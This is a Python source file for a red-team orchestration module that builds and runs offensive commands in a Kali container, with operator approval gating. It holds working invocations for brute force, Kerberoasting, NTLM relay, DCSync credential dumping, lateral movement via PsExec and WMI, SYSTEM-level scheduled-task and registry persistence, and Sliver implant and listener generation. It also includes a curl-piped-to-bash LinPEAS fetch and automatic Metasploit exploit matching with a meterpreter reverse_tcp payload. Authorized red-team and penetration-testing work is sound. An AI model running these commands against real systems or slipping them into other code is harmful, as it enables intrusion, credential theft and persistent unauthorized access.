"""Red Team Module — Offensive operations orchestration.

Integrates with Action Center for operator-gated execution:
- Credential Attacks: Hydra, Impacket, CrackMapExec
- Metasploit RPC: Exploit matching, session management (REAL client)
- AD/Entra ID: BloodHound, Kerberoasting, GPO abuse
- Lateral Movement: SMB, WinRM, SSH, RDP, DCOM
- Cloud Exploitation: Pacu (AWS), CloudFox (Azure), MicroBurst
- C2 Management: Sliver (REAL gRPC/CLI), Mythic implant generation
- Post-Exploitation: Seatbelt, SharpUp, LinPEAS/WinPEAS
- Persistence: Scheduled tasks, Services, WMI, Registry
- Smart Attack Chain: vulnerability → tool mapping
- Network Scanning: masscan, zmap, nmap
- Social Engineering: phishing, credential harvesting
- Wireless: bettercap MITM, WiFi attacks
- Anti-Forensics: timestomp, log cleanup
- Data Exfiltration: DNS tunnel, covert channels
- IOC Management: STIX/TAXII export
- Password Cracking: hashcat, john
- Evasion: AMSI bypass, AV evasion
- MITRE ATT&CK Heatmap: coverage visualization
- Network Topology: attack path mapping
- Red Team Report: professional engagement reports
"""
from __future__ import annotations

import json
import logging
import os
import re
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

# Import real clients (lazy optional imports)
from modules.redteam.config import get_config, RedTeamConfig
# Sliver and Metasploit may require external dependencies (e.g., grpc). Import them lazily.
try:
    from modules.redteam.sliver import SliverClient, SliverImplant, SliverListener, SliverSession
except Exception as e:
    import logging
    logging.getLogger('AttackSurface.RedTeam').debug('Sliver import skipped: %s', e)
    SliverClient = SliverImplant = SliverListener = SliverSession = None
try:
    from modules.redteam.metasploit import MSFRPCClient, MSFModule, MSFSession
except Exception as e:
    import logging
    logging.getLogger('AttackSurface.RedTeam').debug('Metasploit import skipped: %s', e)
    MSFRPCClient = MSFModule = MSFSession = None

# v0.21.0 — New modules
from modules.redteam.attack_chain import SmartAttackChain, AttackOption, PreparedAttack
from modules.redteam.ad_attacks import ActiveDirectoryAttacks, KerberosAttack, NTLMAttack, CertificateAbuse
from modules.redteam.c2_console import C2Console, SessionManager, ListenerManager
from modules.redteam.mitre_heatmap import MITREHeatmap
from modules.redteam.network_topology import NetworkTopology
from modules.redteam.network_scanning import NetworkScanner
from modules.redteam.password_cracking import PasswordCracker
from modules.redteam.evasion import EvasionEngine
from modules.redteam.social_engineering import SocialEngineering
from modules.redteam.wireless import WirelessAttacks
from modules.redteam.anti_forensics import AntiForensics
from modules.redteam.data_exfil import DataExfiltration
from modules.redteam.ioc_manager import IOCManager
from modules.redteam.red_team_report import RedTeamReport

logger = logging.getLogger("AttackSurface.RedTeam")


@dataclass
class RedTeamAction:
    """Represents a red team action for Action Center."""
    tool: str
    cmd: List[str]
    target: str
    category: str  # credential, exploit, lateral, cloud, c2, post, persist
    mitre_techniques: List[str]
    safe: bool = False  # False = requires operator approval
    description: str = ""
    evidence_path: Optional[str] = None


@dataclass
class RedTeamResult:
    """Result of a red team action execution."""
    action: RedTeamAction
    rc: int
    stdout: str
    stderr: str
    started_at: str
    finished_at: str
    evidence_files: List[str] = field(default_factory=list)


class RedTeamOrchestrator:
    """Orchestrates red team operations via Action Center."""

    def __init__(self, kali_container: str = "kali-as"):
        self.kali_container = kali_container
        self.results_dir = Path(os.path.expanduser("~/.attack_surface/redteam_results"))
        self.results_dir.mkdir(parents=True, exist_ok=True)

    def _run_in_kali(self, cmd: List[str], timeout: int = 600) -> subprocess.CompletedProcess:
        """Execute command in Kali Docker container."""
        full_cmd = ["docker", "exec", self.kali_container] + cmd
        return subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)

    # =========================================================================
    # Credential Attacks
    # =========================================================================

    def hydra_bruteforce(self, target: str, service: str, user_list: str,
                         pass_list: str, **kwargs) -> RedTeamAction:
        """Hydra brute force attack."""
        cmd = ["hydra", "-L", user_list, "-P", pass_list,
               "-o", f"/tmp/hydra_{target}_{service}.txt",
               target, service]
        return RedTeamAction(
            tool="hydra",
            cmd=cmd,
            target=target,
            category="credential",
            mitre_techniques=["T1110.001", "T1110.003"],
            safe=False,
            description=f"Hydra {service} brute force on {target}"
        )

    def kerberoast(self, domain: str, user: str, password: str,
                   dc_ip: str = None) -> RedTeamAction:
        """Kerberoasting via Impacket GetUserSPNs."""
        cmd = ["python3", "/usr/share/doc/python3-impacket/examples/GetUserSPNs.py",
               "-request", f"{domain}/{user}:{password}"]
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        return RedTeamAction(
            tool="impacket-GetUserSPNs",
            cmd=cmd,
            target=domain,
            category="credential",
            mitre_techniques=["T1558.003"],
            safe=False,
            description=f"Kerberoasting on {domain}"
        )

    def asreproast(self, domain: str, dc_ip: str = None) -> RedTeamAction:
        """AS-REP Roasting (no auth required)."""
        cmd = ["python3", "/usr/share/doc/python3-impacket/examples/GetNPUsers.py",
               "-no-pass", "-format", "hashcat", domain]
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        return RedTeamAction(
            tool="impacket-GetNPUsers",
            cmd=cmd,
            target=domain,
            category="credential",
            mitre_techniques=["T1558.004"],
            safe=False,
            description=f"AS-REP Roasting on {domain}"
        )

    def ntlm_relay(self, targets_file: str, domain: str = None) -> RedTeamAction:
        """NTLM Relay attack via ntlmrelayx."""
        cmd = ["python3", "/usr/share/doc/python3-impacket/examples/ntlmrelayx.py",
               "-tf", targets_file, "-smb2support"]
        if domain:
            cmd.extend(["-domain", domain])
        return RedTeamAction(
            tool="impacket-ntlmrelayx",
            cmd=cmd,
            target=targets_file,
            category="credential",
            mitre_techniques=["T1557.001"],
            safe=False,
            description=f"NTLM Relay to targets in {targets_file}"
        )

    def crackmapexec_smb(self, target: str, user: str = None,
                         password: str = None, hash: str = None,
                         module: str = None) -> RedTeamAction:
        """CrackMapExec SMB enumeration/attack."""
        cmd = ["crackmapexec", "smb", target]
        if user:
            cmd.extend(["-u", user])
        if password:
            cmd.extend(["-p", password])
        if hash:
            cmd.extend(["-H", hash])
        if module:
            cmd.extend(["-M", module])
        return RedTeamAction(
            tool="crackmapexec",
            cmd=cmd,
            target=target,
            category="credential",
            mitre_techniques=["T1021.002", "T1550.002"],
            safe=False,
            description=f"CrackMapExec SMB on {target}"
        )

    # =========================================================================
    # Metasploit RPC
    # =========================================================================

    def msf_exploit(self, exploit: str, target: str, payload: str = None,
                    options: Dict[str, str] = None) -> RedTeamAction:
        """Execute Metasploit exploit via msfconsole -r resource script."""
        rc_content = f"use {exploit}\nset RHOSTS {target}\n"
        if payload:
            rc_content += f"set PAYLOAD {payload}\n"
        if options:
            for k, v in options.items():
                rc_content += f"set {k} {v}\n"
        rc_content += "exploit -j\n"

        rc_file = f"/tmp/msf_{exploit.replace('/', '_')}_{int(time.time())}.rc"
        # Write RC file to container
        write_cmd = ["bash", "-c", f"cat > {rc_file} << 'EOF'\n{rc_content}EOF"]
        self._run_in_kali(write_cmd)

        cmd = ["msfconsole", "-q", "-r", rc_file]
        return RedTeamAction(
            tool="metasploit",
            cmd=cmd,
            target=target,
            category="exploit",
            mitre_techniques=["T1190", "T1059"],
            safe=False,
            description=f"Metasploit {exploit} on {target}"
        )

    def msf_sessions(self) -> RedTeamAction:
        """List active Metasploit sessions."""
        cmd = ["msfconsole", "-q", "-x", "sessions -l; exit"]
        return RedTeamAction(
            tool="metasploit",
            cmd=cmd,
            target="localhost",
            category="exploit",
            mitre_techniques=["T1059"],
            safe=True,
            description="List Metasploit sessions"
        )

    # =========================================================================
    # AD / Entra ID Attacks
    # =========================================================================

    def bloodhound_ingest(self, domain: str, user: str, password: str,
                          dc_ip: str = None, collection: str = "all") -> RedTeamAction:
        """Run BloodHound Python ingestor (bloodhound.py)."""
        cmd = ["bloodhound-python", "-d", domain, "-u", user, "-p", password,
               "-c", collection, "--zip"]
        if dc_ip:
            cmd.extend(["-dc", dc_ip])
        return RedTeamAction(
            tool="bloodhound-python",
            cmd=cmd,
            target=domain,
            category="ad",
            mitre_techniques=["T1069.002", "T1087.002"],
            safe=False,
            description=f"BloodHound collection on {domain}"
        )

    def gpo_abuse(self, domain: str, user: str, password: str,
                  gpo_name: str, command: str) -> RedTeamAction:
        """GPO abuse via pyGPOAbuse or SharpGPOAbuse."""
        cmd = ["python3", "/opt/pyGPOAbuse/pyGPOAbuse.py",
               "-d", domain, "-u", user, "-p", password,
               "--gpo-name", gpo_name, "--command", command]
        return RedTeamAction(
            tool="pyGPOAbuse",
            cmd=cmd,
            target=domain,
            category="ad",
            mitre_techniques=["T1484.001"],
            safe=False,
            description=f"GPO abuse on {domain}"
        )

    def dcsync(self, domain: str, user: str, password: str,
               dc_ip: str = None) -> RedTeamAction:
        """DCSync attack via secretsdump.py."""
        cmd = ["python3", "/usr/share/doc/python3-impacket/examples/secretsdump.py",
               f"{domain}/{user}:{password}"]
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        cmd.extend(["-just-dc", "-outputfile", f"/tmp/dcsync_{domain}"])
        return RedTeamAction(
            tool="impacket-secretsdump",
            cmd=cmd,
            target=domain,
            category="ad",
            mitre_techniques=["T1003.006"],
            safe=False,
            description=f"DCSync on {domain}"
        )

    # =========================================================================
    # Lateral Movement
    # =========================================================================

    def psexec(self, target: str, user: str, password: str = None,
               hash: str = None, command: str = "cmd.exe") -> RedTeamAction:
        """PsExec via Impacket."""
        cmd = ["python3", "/usr/share/doc/python3-impacket/examples/psexec.py"]
        if hash:
            cmd.extend(["-hashes", hash, f"{user}@{target}"])
        else:
            cmd.extend([f"{user}:{password}@{target}"])
        cmd.extend([command])
        return RedTeamAction(
            tool="impacket-psexec",
            cmd=cmd,
            target=target,
            category="lateral",
            mitre_techniques=["T1021.002"],
            safe=False,
            description=f"PsExec on {target}"
        )

    def wmiexec(self, target: str, user: str, password: str = None,
                hash: str = None, command: str = "cmd.exe") -> RedTeamAction:
        """WMIExec via Impacket."""
        cmd = ["python3", "/usr/share/doc/python3-impacket/examples/wmiexec.py"]
        if hash:
            cmd.extend(["-hashes", hash, f"{user}@{target}"])
        else:
            cmd.extend([f"{user}:{password}@{target}"])
        cmd.extend([command])
        return RedTeamAction(
            tool="impacket-wmiexec",
            cmd=cmd,
            target=target,
            category="lateral",
            mitre_techniques=["T1047"],
            safe=False,
            description=f"WMIExec on {target}"
        )

    def smbexec(self, target: str, user: str, password: str = None,
                hash: str = None) -> RedTeamAction:
        """SMBExec via Impacket."""
        cmd = ["python3", "/usr/share/doc/python3-impacket/examples/smbexec.py"]
        if hash:
            cmd.extend(["-hashes", hash, f"{user}@{target}"])
        else:
            cmd.extend([f"{user}:{password}@{target}"])
        return RedTeamAction(
            tool="impacket-smbexec",
            cmd=cmd,
            target=target,
            category="lateral",
            mitre_techniques=["T1021.002"],
            safe=False,
            description=f"SMBExec on {target}"
        )

    def ssh_exec(self, target: str, user: str, key: str = None,
                 password: str = None, command: str = "id") -> RedTeamAction:
        """SSH command execution."""
        cmd = ["ssh"]
        if key:
            cmd.extend(["-i", key])
        cmd.extend([f"{user}@{target}", command])
        return RedTeamAction(
            tool="ssh",
            cmd=cmd,
            target=target,
            category="lateral",
            mitre_techniques=["T1021.004"],
            safe=False,
            description=f"SSH exec on {target}"
        )

    # =========================================================================
    # Cloud Exploitation
    # =========================================================================

    def pacu_aws(self, module: str, profile: str = "default",
                 regions: str = "us-east-1") -> RedTeamAction:
        """Pacu AWS exploitation framework."""
        cmd = ["pacu", "--profile", profile, "--regions", regions,
               "-x", f"run {module}"]
        return RedTeamAction(
            tool="pacu",
            cmd=cmd,
            target="aws",
            category="cloud",
            mitre_techniques=["T1526", "T1611"],
            safe=False,
            description=f"Pacu AWS module: {module}"
        )

    def cloudfox_azure(self, subscription: str = None) -> RedTeamAction:
        """CloudFox Azure enumeration."""
        cmd = ["cloudfox", "azure"]
        if subscription:
            cmd.extend(["--subscription", subscription])
        return RedTeamAction(
            tool="cloudfox",
            cmd=cmd,
            target="azure",
            category="cloud",
            mitre_techniques=["T1526", "T1087.004"],
            safe=False,
            description="CloudFox Azure enumeration"
        )

    # =========================================================================
    # C2 Management
    # =========================================================================

    def sliver_implant(self, lhost: str, lport: int, fmt: str = "exe",
                       os: str = "windows", arch: str = "amd64") -> RedTeamAction:
        """Generate Sliver implant."""
        cmd = ["sliver-server", "generate", "--lhost", lhost, "--lport", str(lport),
               "--format", fmt, "--os", os, "--arch", arch,
               "--output", f"/tmp/sliver_implant_{int(time.time())}.{fmt}"]
        return RedTeamAction(
            tool="sliver",
            cmd=cmd,
            target=lhost,
            category="c2",
            mitre_techniques=["T1105", "T1573"],
            safe=False,
            description=f"Sliver implant generation ({os}/{arch})"
        )

    def sliver_listener(self, protocol: str = "mtls", port: int = 443) -> RedTeamAction:
        """Start Sliver listener."""
        cmd = ["sliver-server", "listen", protocol, str(port)]
        return RedTeamAction(
            tool="sliver",
            cmd=cmd,
            target="localhost",
            category="c2",
            mitre_techniques=["T1071.001", "T1573"],
            safe=False,
            description=f"Sliver {protocol} listener on port {port}"
        )

    # =========================================================================
    # Post-Exploitation
    # =========================================================================

    def seatbelt(self, target: str = "localhost", group: str = "all") -> RedTeamAction:
        """Seatbelt safety checks (post-exploitation enumeration)."""
        cmd = ["Seatbelt.exe", f"group={group}"]
        return RedTeamAction(
            tool="seatbelt",
            cmd=cmd,
            target=target,
            category="post",
            mitre_techniques=["T1082", "T1083", "T1012"],
            safe=False,
            description=f"Seatbelt {group} on {target}"
        )

    def linpeas(self, target: str = "localhost") -> RedTeamAction:
        """LinPEAS Linux privilege escalation checks."""
        cmd = ["bash", "-c", "curl -s https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash"]
        return RedTeamAction(
            tool="linpeas",
            cmd=cmd,
            target=target,
            category="post",
            mitre_techniques=["T1068", "T1548"],
            safe=False,
            description=f"LinPEAS on {target}"
        )

    def winpeas(self, target: str = "localhost") -> RedTeamAction:
        """WinPEAS Windows privilege escalation checks."""
        cmd = ["winPEASx64.exe"]
        return RedTeamAction(
            tool="winpeas",
            cmd=cmd,
            target=target,
            category="post",
            mitre_techniques=["T1068", "T1548"],
            safe=False,
            description=f"WinPEAS on {target}"
        )

    # =========================================================================
    # Persistence
    # =========================================================================

    def schtasks_persist(self, target: str, user: str, password: str,
                         task_name: str, command: str) -> RedTeamAction:
        """Scheduled task persistence via Impacket atexec."""
        cmd = ["python3", "/usr/share/doc/python3-impacket/examples/atexec.py",
               f"{user}:{password}@{target}",
               f"schtasks /create /tn {task_name} /tr \"{command}\" /sc onlogon /ru system"]
        return RedTeamAction(
            tool="impacket-atexec",
            cmd=cmd,
            target=target,
            category="persist",
            mitre_techniques=["T1053.005"],
            safe=False,
            description=f"Scheduled task persistence on {target}"
        )

    def registry_persist(self, target: str, user: str, password: str,
                         key_path: str, value_name: str, command: str) -> RedTeamAction:
        """Registry Run key persistence via Impacket atexec."""
        cmd = ["python3", "/usr/share/doc/python3-impacket/examples/atexec.py",
               f"{user}:{password}@{target}",
               f'reg add "{key_path}" /v {value_name} /t REG_SZ /d "{command}" /f']
        return RedTeamAction(
            tool="impacket-atexec",
            cmd=cmd,
            target=target,
            category="persist",
            mitre_techniques=["T1547.001"],
            safe=False,
            description=f"Registry persistence on {target}"
        )

    # =========================================================================
    # Action Execution
    # =========================================================================

    def execute_action(self, action: RedTeamAction) -> RedTeamResult:
        """Execute a red team action in Kali container."""
        started = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        logger.info("Executing red team action: %s on %s", action.tool, action.target)

        try:
            result = self._run_in_kali(action.cmd, timeout=600)
            finished = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

            # Save evidence
            evidence_files = []
            if result.stdout:
                out_file = self.results_dir / f"{action.tool}_{action.target}_{int(time.time())}.stdout"
                out_file.write_text(result.stdout)
                evidence_files.append(str(out_file))
            if result.stderr:
                err_file = self.results_dir / f"{action.tool}_{action.target}_{int(time.time())}.stderr"
                err_file.write_text(result.stderr)
                evidence_files.append(str(err_file))

            return RedTeamResult(
                action=action,
                rc=result.returncode,
                stdout=result.stdout,
                stderr=result.stderr,
                started_at=started,
                finished_at=finished,
                evidence_files=evidence_files
            )
        except subprocess.TimeoutExpired:
            finished = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            return RedTeamResult(
                action=action,
                rc=-1,
                stdout="",
                stderr="Timeout expired",
                started_at=started,
                finished_at=finished
            )
        except Exception as e:
            finished = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
            return RedTeamResult(
                action=action,
                rc=-1,
                stdout="",
                stderr=str(e),
                started_at=started,
                finished_at=finished
            )

    # =========================================================================
    # Mapping: Finding -> Red Team Actions
    # =========================================================================

    def map_finding_to_actions(self, finding: Dict) -> List[RedTeamAction]:
        """Map a finding to relevant red team actions."""
        actions = []
        f_type = str(finding.get("type", "") or "").lower()
        f_title = str(finding.get("title", "") or "").lower()
        host = finding.get("host", "") or finding.get("target", "") or ""
        # Findings may be plain strings or dicts; match on combined text
        text = f"{f_type} {f_title}".strip()

        # Wordlists present in the Kali tool container
        USERS = "/usr/share/metasploit-framework/data/wordlists/unix_users.txt"
        PASSES = "/usr/share/wordlists/rockyou.txt"

        # Credential findings → brute force (operator fires from terminal)
        if any(k in text for k in ["login", "auth", "credential", "password",
                                    "brute", "weak pass", "default cred"]):
            actions.append(self.hydra_bruteforce(host, "ssh", USERS, PASSES))

        # Exposed auth services → brute force the exposed service
        if re.search(r"\bssh\b.*open|open.*\bssh\b|port 22", text):
            actions.append(self.hydra_bruteforce(host, "ssh", USERS, PASSES))
        if re.search(r"\bftp\b.*open|open.*\bftp\b|port 21", text):
            actions.append(self.hydra_bruteforce(host, "ftp", USERS, PASSES))
        if re.search(r"telnet|port 23", text):
            actions.append(self.hydra_bruteforce(host, "telnet", USERS, PASSES))

        # SMB/Windows findings
        if any(k in text for k in ["smb", "445", "smbv1", "eternalblue", "ms17-010"]):
            actions.append(self.crackmapexec_smb(host, module="enum_shares"))
            actions.append(self.crackmapexec_smb(host, module="spider_plus"))

        # Exposed database ports → service version scan (recon before abuse)
        if re.search(r"3306|5432|6379|27017|database port|mysql|postgres|redis|mongo", text):
            actions.append(RedTeamAction(
                tool="nmap", cmd=["nmap", "-sV", "-sC", "-p", "3306,5432,6379,27017", host],
                target=host, category="credential",
                mitre_techniques=["T1046"], safe=False,
                description=f"Version scan on exposed DB ports of {host}"))

        # Web findings -> Metasploit
        if any(k in text for k in ["rce", "deserialization", "ssti", "cmd_injection"]):
            actions.append(self.msf_exploit("exploit/multi/http/tomcat_cve_2020_1938", host))

        # AD findings
        if any(k in text for k in ["ad ", "ldap", "kerberos", "gpo", "dcsync"]):
            actions.append(self.bloodhound_ingest(host, "user", "pass"))
            actions.append(self.dcsync(host, "user", "pass"))

        # Cloud findings
        if any(k in text for k in ["s3", "aws", "azure", "gcp", "cloud"]):
            actions.append(self.pacu_aws("iam__privesc_scan"))

        return actions


# Convenience function
def create_redteam_orchestrator(kali_container: str = "kali-as") -> RedTeamOrchestrator:
    return RedTeamOrchestrator(kali_container)


# =========================================================================
# Real Client Integration Methods
# =========================================================================

class RedTeamRealClients:
    """High-level interface using real Sliver/Metasploit clients."""

    def __init__(self, config: RedTeamConfig = None):
        from modules.redteam.config import get_config
        self.config = config or get_config()
        self._sliver: SliverClient | None = None
        self._msf: MSFRPCClient | None = None

    @property
    def sliver(self) -> SliverClient:
        if self._sliver is None:
            self._sliver = SliverClient(self.config)
        return self._sliver

    @property
    def metasploit(self) -> MSFRPCClient:
        if self._msf is None:
            self._msf = MSFRPCClient(self.config.metasploit)
        return self._msf

    # ---- Sliver Operations ----

    def sliver_generate_implant(self, name: str, profile: str = "http",
                                 lhost: str = "", lport: int = 0,
                                 format: str = "exe", os: str = "windows",
                                 arch: str = "amd64") -> dict[str, Any]:
        """Generate Sliver implant via real client."""
        implant = SliverImplant(
            name=name, profile=profile, lhost=lhost, lport=lport,
            format=format, os=os, arch=arch
        )
        return self.sliver.generate_implant(implant)

    def sliver_start_listener(self, name: str, profile: str = "http",
                               port: int = 80, bind: str = "0.0.0.0",
                               mtls: bool = False) -> dict[str, Any]:
        """Start Sliver listener via real client."""
        listener = SliverListener(name=name, profile=profile, bind_addr=bind, port=port, mtls=mtls)
        return self.sliver.start_listener(listener)

    def sliver_list_sessions(self) -> list[SliverSession]:
        """List Sliver sessions via real client."""
        return self.sliver.list_sessions()

    def sliver_interact(self, session_id: str, command: str) -> dict[str, Any]:
        """Interact with Sliver session."""
        return self.sliver.interact_session(session_id, command)

    def sliver_execute_assembly(self, session_id: str, assembly_path: str, args: str = "") -> dict[str, Any]:
        """Execute .NET assembly in Sliver session."""
        return self.sliver.execute_assembly(session_id, assembly_path, args)

    # ---- Metasploit Operations ----

    def msf_connect(self) -> dict[str, Any]:
        """Connect to msfrpcd."""
        return self.metasploit.connect()

    def msf_find_exploits(self, cve: str) -> list[MSFModule]:
        """Find exploits for CVE."""
        return self.metasploit.module_exploit_matching_cve(cve)

    def msf_exploit_target(self, target: str, cves: list[str], payload: str = "auto") -> dict[str, Any]:
        """Auto-exploit target for CVEs."""
        return self.metasploit.exploit_auto(target, cves, payload)

    def msf_list_sessions(self) -> list[MSFSession]:
        """List Metasploit sessions."""
        return self.metasploit.session_list()

    def msf_session_interact(self, session_id: int, command: str) -> dict[str, Any]:
        """Interact with Metasploit session."""
        return self.metasploit.session_meterpreter_write(session_id, command)

    def msf_exploit_with_payload(self, module: str, target: str,
                                  payload: str = "windows/x64/meterpreter/reverse_tcp",
                                  lhost: str = "", lport: int = 4444) -> dict[str, Any]:
        """Execute specific exploit with payload."""
        return self.metasploit.exploit_with_payload(module, target, payload, lhost, lport)

    # ---- Combined Workflows ----

    def auto_exploit_scan_findings(self, scan_findings: list[dict]) -> list[dict]:
        """
        Take scan findings with CVEs, auto-match exploits, return actionable results.
        """
        results = []
        for finding in scan_findings:
            cves = finding.get("cves", [])
            host = finding.get("host", "")
            if not cves or not host:
                continue
            
            # Find exploits for each CVE
            for cve in cves:
                modules = self.msf_find_exploits(cve)
                for mod in modules[:3]:  # Top 3 matches
                    results.append({
                        "finding": finding,
                        "cve": cve,
                        "exploit": mod.fullname,
                        "description": mod.description,
                        "rank": mod.rank,
                        "target": host
                    })
        return results